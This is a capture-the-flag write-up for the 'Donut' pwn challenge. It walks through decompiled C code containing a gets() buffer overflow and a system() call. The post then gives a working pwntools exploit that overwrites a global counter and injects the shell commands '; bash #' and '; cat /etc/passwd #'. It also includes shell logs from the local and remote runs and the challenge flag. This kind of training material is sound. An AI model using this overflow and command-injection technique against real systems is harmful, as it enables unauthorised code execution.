# Donut

## Description

`nc pwn.ctf.uscybergames.com 5000`

[donut](https://ctf.uscybergames.com/files/c43253facb006d7f0929f2c888952897/donut?token=eyJ1c2VyX2lkIjoxMDY4LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMX0.aE2IDw.hnopMAh_w9gPG8TCLXlnLI7Ca-4)

## Solution

Decompile with your favorite decompiler or [https://dogbolt.org/?id=9d3b3f31-5de2-40ee-a205-727743976140#Hex-Rays=280](https://dogbolt.org/?id=9d3b3f31-5de2-40ee-a205-727743976140#Hex-Rays=280)

![Donut.png](/assets/ctf/uscybergames/donut.png)

Copy Hex-Rays code and ask ChatGPT to kindly rewrite the code into what programmer would normally write:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/random.h>

#define DONUT_COST 50
#define ADMIN_MAGIC -889275714
#define CMD_SIZE 104

int money = 1330;
int donuts = 1;
char timezone[32] = "America/Los_Angeles";

void show_menu() {
    puts("Options:");
    puts("1. Buy a donut");
    puts("2. Earn money to use in the shop");
    puts("3. Maintenance");
    puts("4. Exit");
}

void buy_donuts() {
    int order;
    printf("You have %d dollars\n", money);
    puts("How many donuts would you like to buy?");
    printf("> ");
    scanf("%d", &order);

    if (order <= 0) {
        puts("Invalid amount of donuts!");
        return;
    }

    int total_cost = order * DONUT_COST;
    if (money >= total_cost) {
        donuts += order;
        money -= total_cost;
        printf("Bought %d donuts. Your balance is now %d.\n", donuts, money);
    } else {
        puts("Not enough money!");
    }
}

void earn_money() {
    int target, guess;
    getrandom(&target, sizeof(int), 0);

    puts("What is your guess?");
    printf("> ");
    scanf("%d", &guess);

    if (guess == target) {
        puts("Correct! You get $50");
        money += 50;
    } else {
        puts("Oops, you lost half of your money!");
        money /= 2;
    }
}

void admin_maintenance() {
    if (donuts != ADMIN_MAGIC) {
        puts("You aren't authorized to access this!");
        return;
    }

    puts("Welcome to the admin panel!");
    puts("Date:");

    char cmd[CMD_SIZE];
    snprintf(cmd, sizeof(cmd), "date --date='TZ=\"%s\"'", timezone);
    system(cmd);

    puts("What would you like to set your balance to?");
    printf("> ");
    scanf("%d", &money);
    puts("Balance set!");
}

int main(int argc, char **argv, char **envp) {
    int choice;

    donuts = 0;
    puts("Welcome to the donut shop!");
    puts("Please enter your timezone so that we can tailor your experience for today:");
    printf("> ");
    gets(timezone);  // Vulnerable function
    printf("Timezone set to %s!\n", timezone);

    while (1) {
        show_menu();
        printf("> ");
        scanf("%d", &choice);

        switch (choice) {
            case 1:
                buy_donuts();
                break;
            case 2:
                earn_money();
                break;
            case 3:
                admin_maintenance();
                break;
            case 4:
                return 0;
            default:
                puts("Unknown choice!");
                break;
        }
    }

    return 0;
}
```

Our target is `admin_maintenance` function, because it contains `system` call which is controlled by the very first input in program; This leads to RCE so nom nom nom.

However it's not easy to reach the function, `donuts` count must be equal to `ADMIN_MAGIC (-889275714)` and we can't buy negative donuts. Ideally somewhere there should be integer overflow, or overwrite the address with `gets`.

The exploit is pretty easy, we just have to overwrite the variable on stack to get into the admin panel and inject RCE.

The variables `timezone`, `money`, and `donuts` are declared **in global scope**, and are laid out in memory consecutively (as is often the case in simple ELF binaries).

So if `timezone` is 32 bytes long, to overwrite `donuts` you need to **overflow past `timezone` and `money`**:
- `timezone`: 32 bytes
- `money`: 4 bytes (standard `int`)

So to reach `donuts`, you must overflow:
```bash
32 (timezone) + 4 (money) = 36 bytes
```

Script:
```python
from pwn import *

# context.log_level = "DEBUG"

exe = "./donut"
elf = context.binary = ELF(exe, checksec=False)

if args.REMOTE:
    io = remote('pwn.ctf.uscybergames.com', 5000)
else:
    io = process(exe)

exploit = b'1"\'; cat /etc/passwd #'
exploit = b'1"\'; bash #'
padding = (32 - len(exploit)) + 4 # 32 timezone, 4 money
payload = flat(
    exploit,
    b"\x90" * padding,
    pack(0xCAFEBABE)
)

io.sendlineafter(b'> ', payload)
io.sendlineafter(b'> ', b'3')
# io.recvallS() ### If reading command
io.interactive()
```

```bash
└─$ py donut.py
[+] Starting local process './donut': pid 21985
[*] Switching to interactive mode
Welcome to the admin panel!
Date:
Fri Jun 13 08:00:00 PM EDT 2025
$ id
uid=1001(woyag) gid=1001(woyag) groups=1001(woyag),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),106(bluetooth),113(scanner),135(wireshark),137(kaboxer),138(vboxsf),139(docker),1002(opt)
$ exit
What would you like to set your balance to?
> $
[*] Interrupted
[*] Stopped process './donut' (pid 21985)

└─$ py donut.py REMOTE
[+] Opening connection to pwn.ctf.uscybergames.com on port 5000: Done
[*] Switching to interactive mode
Welcome to the admin panel!
Date:
Sat Jun 14 00:00:00 UTC 2025
$ id
uid=1000 gid=1000 groups=1000
$ cat /flag.txt
SVBGR{my_fav0rIte_fl4vor_1s_Or3o_54ac91c0}
```

::: tip Flag
`SVBGR{my_fav0rIte_fl4vor_1s_Or3o_54ac91c0}`
:::

